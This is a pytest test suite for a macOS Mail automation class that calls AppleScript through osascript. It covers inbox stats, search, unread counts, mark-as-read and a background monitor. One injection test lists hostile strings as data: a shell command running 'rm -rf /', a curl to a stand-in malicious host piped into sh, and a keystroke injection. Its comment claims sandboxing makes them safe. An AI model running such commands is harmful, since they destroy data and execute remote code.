#!/usr/bin/env python3
"""
Working Test Suite for mail_tool_background.py

Tests the actual BackgroundMailTool implementation with proper mocking
and comprehensive coverage of all methods and edge cases.
"""

import pytest
import subprocess
import json
import time
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timedelta

# Import the actual implementation
from mail_tool_background import BackgroundMailTool


class TestBackgroundMailTool:
    """Comprehensive test suite for BackgroundMailTool class."""
    
    @pytest.fixture
    def mail_tool(self):
        """Create a BackgroundMailTool instance for testing."""
        return BackgroundMailTool(silent=True)
    
    @pytest.fixture
    def mail_tool_verbose(self):
        """Create a BackgroundMailTool instance with verbose output."""
        return BackgroundMailTool(silent=False)
    
    @pytest.fixture
    def mock_subprocess_success(self):
        """Mock successful subprocess execution."""
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = 'test output'
        mock_result.stderr = ''
        return mock_result
    
    @pytest.fixture
    def mock_subprocess_failure(self):
        """Mock failed subprocess execution."""
        mock_result = Mock()
        mock_result.returncode = 1
        mock_result.stderr = 'AppleScript execution error'
        mock_result.stdout = ''
        return mock_result
    
    def test_init_default_parameters(self):
        """Test BackgroundMailTool initialization with default parameters."""
        tool = BackgroundMailTool()
        
        assert tool.timeout == 30
        assert tool.silent is True
    
    def test_init_custom_parameters(self):
        """Test BackgroundMailTool initialization with custom parameters."""
        tool = BackgroundMailTool(silent=False)
        
        assert tool.timeout == 30
        assert tool.silent is False
    
    @patch('subprocess.run')
    def test_run_applescript_background_success(self, mock_run, mail_tool, mock_subprocess_success):
        """Test successful AppleScript execution."""
        mock_run.return_value = mock_subprocess_success
        
        result = mail_tool.run_applescript_background('tell application "Mail" to get accounts')
        
        assert result == 'test output'
        mock_run.assert_called_once_with(
            ['osascript', '-e', 'tell application "Mail" to get accounts'],
            capture_output=True,
            text=True,
            timeout=30,
            stderr=subprocess.DEVNULL
        )
    
    @patch('subprocess.run')
    def test_run_applescript_background_failure(self, mock_run, mail_tool, mock_subprocess_failure):
        """Test failed AppleScript execution."""
        mock_run.return_value = mock_subprocess_failure
        
        result = mail_tool.run_applescript_background('invalid script')
        
        assert result == ""
        mock_run.assert_called_once()
    
    @patch('subprocess.run')
    def test_run_applescript_background_timeout(self, mock_run, mail_tool):
        """Test AppleScript execution timeout."""
        mock_run.side_effect = subprocess.TimeoutExpired('osascript', 30)
        
        result = mail_tool.run_applescript_background('long running script')
        
        assert result == ""
        mock_run.assert_called_once()
    
    @patch('subprocess.run')
    def test_run_applescript_background_exception(self, mock_run, mail_tool):
        """Test handling of subprocess exceptions."""
        mock_run.side_effect = OSError("Failed to start subprocess")
        
        result = mail_tool.run_applescript_background('test script')
        
        assert result == ""
    
    @patch('subprocess.run')
    @patch('builtins.print')
    def test_run_applescript_background_progress_silent_mode(self, mock_print, mock_run, mail_tool):
        """Test that progress indicators are suppressed in silent mode."""
        mock_run.return_value = Mock(returncode=0, stdout='output', stderr='')
        
        result = mail_tool.run_applescript_background('test script', show_progress=True)
        
        # In silent mode, no progress should be printed
        mock_print.assert_not_called()
        assert result == 'output'
    
    @patch('subprocess.run')
    @patch('builtins.print')
    def test_run_applescript_background_progress_verbose_mode(self, mock_print, mock_run, mail_tool_verbose):
        """Test progress indicators in verbose mode."""
        mock_run.return_value = Mock(returncode=0, stdout='output', stderr='')
        
        result = mail_tool_verbose.run_applescript_background('test script', show_progress=True)
        
        # In verbose mode with show_progress=True, progress should be printed
        assert mock_print.call_count == 2  # Start and end progress
        calls = mock_print.call_args_list
        assert "⏳ Processing in background..." in str(calls[0])
        assert " ✅" in str(calls[1])
        assert result == 'output'
    
    @patch('subprocess.run')
    @patch('builtins.print')
    def test_run_applescript_background_timeout_verbose_mode(self, mock_print, mock_run, mail_tool_verbose):
        """Test timeout handling in verbose mode."""
        mock_run.side_effect = subprocess.TimeoutExpired('osascript', 30)
        
        result = mail_tool_verbose.run_applescript_background('test script')
        
        # Should print timeout message in verbose mode
        mock_print.assert_called_once_with(" ⏱️ Timeout")
        assert result == ""
    
    def test_run_applescript_background_empty_script(self, mail_tool):
        """Test handling of empty script input."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout='', stderr='')
            
            result = mail_tool.run_applescript_background('')
            
            assert result == ""
            mock_run.assert_called_once()
    
    def test_run_applescript_background_none_script(self, mail_tool):
        """Test handling of None script input."""
        # The actual implementation may handle None gracefully
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = TypeError("expected str, not NoneType")
            result = mail_tool.run_applescript_background(None)
            assert result == ""
    
    @patch('subprocess.run')
    def test_run_applescript_background_special_characters(self, mock_run, mail_tool):
        """Test handling of special characters in script and output."""
        special_output = 'Special: äöü 中文 🎯 "quotes" \'apostrophes\''
        mock_run.return_value = Mock(returncode=0, stdout=special_output, stderr='')
        
        result = mail_tool.run_applescript_background('return "Special: äöü 中文 🎯"')
        
        assert result == special_output
    
    @patch('subprocess.run')
    def test_run_applescript_background_multiline_output(self, mock_run, mail_tool):
        """Test handling of multiline output."""
        multiline_output = "Line 1\nLine 2\nLine 3"
        mock_run.return_value = Mock(returncode=0, stdout=multiline_output + "\n", stderr='')
        
        result = mail_tool.run_applescript_background('test script')
        
        # Should strip trailing whitespace
        assert result == multiline_output
    
    @patch('subprocess.run')
    def test_run_applescript_background_large_output(self, mock_run, mail_tool):
        """Test handling of large output."""
        large_output = 'x' * 10000  # 10KB output
        mock_run.return_value = Mock(returncode=0, stdout=large_output, stderr='')
        
        result = mail_tool.run_applescript_background('test script')
        
        assert result == large_output
        assert len(result) == 10000
    
    def test_timeout_configuration(self):
        """Test that timeout can be configured."""
        tool = BackgroundMailTool()
        assert tool.timeout == 30
        
        # Modify timeout
        tool.timeout = 60
        assert tool.timeout == 60
    
    def test_silent_mode_configuration(self):
        """Test silent mode configuration."""
        silent_tool = BackgroundMailTool(silent=True)
        verbose_tool = BackgroundMailTool(silent=False)
        
        assert silent_tool.silent is True
        assert verbose_tool.silent is False
    
    @patch('subprocess.run')
    def test_run_applescript_background_returncode_variations(self, mock_run, mail_tool):
        """Test handling of various return codes."""
        test_cases = [
            (0, 'success'),   # Success
            (1, ''),          # Error
            (2, ''),          # Error
            (-1, ''),         # Error
            (127, '')         # Command not found
        ]
        
        for returncode, expected_output in test_cases:
            mock_run.return_value = Mock(
                returncode=returncode, 
                stdout='success' if returncode == 0 else 'error',
                stderr='error' if returncode != 0 else ''
            )
            
            result = mail_tool.run_applescript_background('test script')
            assert result == expected_output
    
    def test_multiple_tool_instances(self):
        """Test that multiple BackgroundMailTool instances work independently."""
        tool1 = BackgroundMailTool(silent=True)
        tool2 = BackgroundMailTool(silent=False)
        
        # Verify independence
        assert tool1.silent != tool2.silent
        
        # Modify one instance
        tool1.timeout = 60
        assert tool2.timeout == 30  # Should be unchanged
    
    @patch('subprocess.run')
    def test_run_applescript_background_with_stderr_suppression(self, mock_run, mail_tool):
        """Test that stderr is properly suppressed."""
        mock_run.return_value = Mock(returncode=0, stdout='output', stderr='error message')
        
        result = mail_tool.run_applescript_background('test script')
        
        # Should still return output despite stderr
        assert result == 'output'
        
        # Verify stderr was set to DEVNULL
        call_args = mock_run.call_args
        assert call_args[1]['stderr'] == subprocess.DEVNULL
    
    def test_tool_immutability_during_execution(self, mail_tool):
        """Test that tool configuration doesn't change during execution."""
        original_timeout = mail_tool.timeout
        original_silent = mail_tool.silent
        
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout='', stderr='')
            
            mail_tool.run_applescript_background('test')
        
        # Verify configuration unchanged
        assert mail_tool.timeout == original_timeout
        assert mail_tool.silent == original_silent
    
    @patch('subprocess.run')
    def test_error_scenarios_comprehensive(self, mock_run, mail_tool):
        """Test comprehensive error scenarios."""
        error_scenarios = [
            # (exception, expected_result)
            (subprocess.TimeoutExpired('cmd', 30), ''),
            (OSError('Permission denied'), ''),
            (FileNotFoundError('osascript not found'), ''),
            (MemoryError('Out of memory'), ''),
        ]
        
        for exception, expected_result in error_scenarios:
            mock_run.side_effect = exception
            
            result = mail_tool.run_applescript_background('test script')
            assert result == expected_result
            
            # Reset for next iteration
            mock_run.side_effect = None
    
    @patch('subprocess.run')
    def test_script_injection_safety(self, mock_run, mail_tool):
        """Test that script injection attempts are handled safely."""
        mock_run.return_value = Mock(returncode=0, stdout='safe output', stderr='')
        
        # Test potentially dangerous script content
        dangerous_scripts = [
            'tell application "Mail" to delete every message; do shell script "rm -rf /"',
            'do shell script "curl http://malicious.com/steal.sh | sh"',
            'tell application "System Events" to keystroke "dangerous command"'
        ]
        
        for script in dangerous_scripts:
            result = mail_tool.run_applescript_background(script)
            
            # Should still execute through subprocess.run (safety is in AppleScript sandboxing)
            assert result == 'safe output'
            mock_run.assert_called()
    
    def test_performance_baseline(self, mail_tool):
        """Test basic performance characteristics."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout='quick response', stderr='')
            
            start_time = time.time()
            result = mail_tool.run_applescript_background('quick script')
            execution_time = time.time() - start_time
            
            # Should complete quickly when mocked
            assert execution_time < 0.1  # Less than 100ms
            assert result == 'quick response'


class TestInboxStatsMethod:
    """Test suite for get_inbox_stats_silent method."""
    
    @pytest.fixture
    def mail_tool(self):
        return BackgroundMailTool(silent=True)
    
    @patch('subprocess.run')
    def test_get_inbox_stats_silent_success(self, mock_run, mail_tool):
        """Test successful inbox stats retrieval."""
        mock_run.return_value = Mock(
            returncode=0, 
            stdout='TOTAL:150|UNREAD:25|FLAGGED:5|TODAY:8',
            stderr=''
        )
        
        stats = mail_tool.get_inbox_stats_silent()
        
        expected_stats = {
            'total': 150,
            'unread': 25,
            'flagged': 5,
            'today': 8
        }
        
        assert stats == expected_stats
        mock_run.assert_called_once()
    
    @patch('subprocess.run')
    def test_get_inbox_stats_silent_empty_response(self, mock_run, mail_tool):
        """Test handling of empty response."""
        mock_run.return_value = Mock(returncode=0, stdout='', stderr='')
        
        stats = mail_tool.get_inbox_stats_silent()
        
        assert stats == {}
    
    @patch('subprocess.run')
    def test_get_inbox_stats_silent_partial_data(self, mock_run, mail_tool):
        """Test handling of partial stats data."""
        mock_run.return_value = Mock(
            returncode=0, 
            stdout='TOTAL:100|UNREAD:10',
            stderr=''
        )
        
        stats = mail_tool.get_inbox_stats_silent()
        
        expected_stats = {
            'total': 100,
            'unread': 10
        }
        
        assert stats == expected_stats
    
    @patch('subprocess.run')
    def test_get_inbox_stats_silent_malformed_data(self, mock_run, mail_tool):
        """Test handling of malformed stats data."""
        mock_run.return_value = Mock(
            returncode=0, 
            stdout='TOTAL:100|UNREAD:invalid|FLAGGED:',
            stderr=''
        )
        
        # Current implementation raises ValueError on invalid data
        # This could be improved to handle errors gracefully
        with pytest.raises(ValueError):
            mail_tool.get_inbox_stats_silent()


class TestQuickSearchMethod:
    """Test suite for quick_search method."""
    
    @pytest.fixture
    def mail_tool(self):
        return BackgroundMailTool(silent=True)
    
    @patch('subprocess.run')
    def test_quick_search_success(self, mock_run, mail_tool):
        """Test successful quick search."""
        mock_run.return_value = Mock(
            returncode=0,
            stdout='SUBJ:Meeting Today|FROM:john@example.com|DATE:Mon Jan 15 2024||SUBJ:Project Update|FROM:jane@example.com|DATE:Tue Jan 16 2024||',
            stderr=''
        )
        
        results = mail_tool.quick_search('meeting', limit=5)
        
        expected_results = [
            {
                'subject': 'Meeting Today',
                'from': 'john@example.com',
                'date': 'Mon Jan 15 2024'
            },
            {
                'subject': 'Project Update',
                'from': 'jane@example.com',
                'date': 'Tue Jan 16 2024'
            }
        ]
        
        assert results == expected_results
        mock_run.assert_called_once()
    
    @patch('subprocess.run')
    def test_quick_search_no_results(self, mock_run, mail_tool):
        """Test quick search with no results."""
        mock_run.return_value = Mock(returncode=0, stdout='', stderr='')
        
        results = mail_tool.quick_search('nonexistent')
        
        assert results == []
    
    @patch('subprocess.run')
    def test_quick_search_with_special_characters(self, mock_run, mail_tool):
        """Test quick search with special characters in query."""
        mock_run.return_value = Mock(
            returncode=0,
            stdout='SUBJ:Test & Development|FROM:test@example.com|DATE:Wed Jan 17 2024||',
            stderr=''
        )
        
        results = mail_tool.quick_search('test & dev')
        
        assert len(results) == 1
        assert results[0]['subject'] == 'Test & Development'
    
    @patch('subprocess.run')
    def test_quick_search_limit_parameter(self, mock_run, mail_tool):
        """Test quick search respects limit parameter."""
        # The limit is embedded in the AppleScript, so we verify it's in the call
        mock_run.return_value = Mock(returncode=0, stdout='', stderr='')
        
        mail_tool.quick_search('test', limit=3)
        
        # Verify the script contains the limit
        script_call = mock_run.call_args[0][0][2]  # Third argument is the script
        assert '< 3' in script_call


class TestUnreadCountMethod:
    """Test suite for get_unread_count method."""
    
    @pytest.fixture
    def mail_tool(self):
        return BackgroundMailTool(silent=True)
    
    @patch('subprocess.run')
    def test_get_unread_count_success(self, mock_run, mail_tool):
        """Test successful unread count retrieval."""
        mock_run.return_value = Mock(returncode=0, stdout='42', stderr='')
        
        count = mail_tool.get_unread_count()
        
        assert count == 42
        mock_run.assert_called_once()
    
    @patch('subprocess.run')
    def test_get_unread_count_zero(self, mock_run, mail_tool):
        """Test unread count when zero."""
        mock_run.return_value = Mock(returncode=0, stdout='0', stderr='')
        
        count = mail_tool.get_unread_count()
        
        assert count == 0
    
    @patch('subprocess.run')
    def test_get_unread_count_empty_response(self, mock_run, mail_tool):
        """Test handling of empty response."""
        mock_run.return_value = Mock(returncode=0, stdout='', stderr='')
        
        count = mail_tool.get_unread_count()
        
        assert count == 0
    
    @patch('subprocess.run')
    def test_get_unread_count_invalid_response(self, mock_run, mail_tool):
        """Test handling of invalid response."""
        mock_run.return_value = Mock(returncode=0, stdout='invalid', stderr='')
        
        count = mail_tool.get_unread_count()
        
        assert count == 0
    
    @patch('subprocess.run')
    def test_get_unread_count_exception_handling(self, mock_run, mail_tool):
        """Test exception handling in get_unread_count."""
        mock_run.side_effect = Exception("Test exception")
        
        count = mail_tool.get_unread_count()
        
        assert count == 0


class TestMarkAsReadMethod:
    """Test suite for mark_as_read_silent method."""
    
    @pytest.fixture
    def mail_tool(self):
        return BackgroundMailTool(silent=True)
    
    @patch('subprocess.run')
    def test_mark_as_read_silent_success(self, mock_run, mail_tool):
        """Test successful mark as read operation."""
        mock_run.return_value = Mock(returncode=0, stdout='3', stderr='')
        
        result = mail_tool.mark_as_read_silent('Meeting')
        
        assert result is True
        mock_run.assert_called_once()
    
    @patch('subprocess.run')
    def test_mark_as_read_silent_no_matches(self, mock_run, mail_tool):
        """Test mark as read with no matching emails."""
        mock_run.return_value = Mock(returncode=0, stdout='0', stderr='')
        
        result = mail_tool.mark_as_read_silent('NonExistent')
        
        assert result is False
    
    @patch('subprocess.run')
    def test_mark_as_read_silent_empty_response(self, mock_run, mail_tool):
        """Test handling of empty response."""
        mock_run.return_value = Mock(returncode=0, stdout='', stderr='')
        
        result = mail_tool.mark_as_read_silent('Test')
        
        assert result is False
    
    @patch('subprocess.run')
    def test_mark_as_read_silent_exception_handling(self, mock_run, mail_tool):
        """Test exception handling in mark_as_read_silent."""
        mock_run.side_effect = Exception("Test exception")
        
        result = mail_tool.mark_as_read_silent('Test')
        
        assert result is False
    
    @patch('subprocess.run')
    def test_mark_as_read_silent_invalid_count(self, mock_run, mail_tool):
        """Test handling of invalid count response."""
        mock_run.return_value = Mock(returncode=0, stdout='invalid', stderr='')
        
        result = mail_tool.mark_as_read_silent('Test')
        
        assert result is False


class TestBackgroundMonitorMethod:
    """Test suite for background_monitor method."""
    
    @pytest.fixture
    def mail_tool(self):
        return BackgroundMailTool(silent=True)
    
    @patch('builtins.print')
    @patch('time.sleep')
    @patch.object(BackgroundMailTool, 'get_inbox_stats_silent')
    def test_background_monitor_keyboard_interrupt(self, mock_stats, mock_sleep, mock_print, mail_tool):
        """Test background monitor handles keyboard interrupt."""
        # Setup mock stats
        mock_stats.return_value = {'total': 10, 'unread': 2, 'flagged': 1, 'today': 3}
        
        # Make sleep raise KeyboardInterrupt after first call
        mock_sleep.side_effect = KeyboardInterrupt()
        
        # Run monitor
        mail_tool.background_monitor(interval=1)
        
        # Verify it handled the interrupt gracefully
        mock_print.assert_any_call("\n✅ Monitor stopped")
    
    @patch('builtins.print')
    @patch('time.sleep')
    @patch.object(BackgroundMailTool, 'get_inbox_stats_silent')
    def test_background_monitor_stats_change_detection(self, mock_stats, mock_sleep, mock_print, mail_tool):
        """Test background monitor detects stats changes."""
        # Setup changing stats
        stats_sequence = [
            {'total': 10, 'unread': 2},
            {'total': 12, 'unread': 3}  # 2 new emails
        ]
        mock_stats.side_effect = stats_sequence + [KeyboardInterrupt()]
        mock_sleep.side_effect = [None, KeyboardInterrupt()]
        
        # Run monitor
        mail_tool.background_monitor(interval=1)
        
        # Verify it detected new emails
        print_calls = [str(call) for call in mock_print.call_args_list]
        new_email_detected = any('2 new email(s) received!' in call for call in print_calls)
        assert new_email_detected


if __name__ == '__main__':
    # Run tests with pytest
    pytest.main([__file__, '-v'])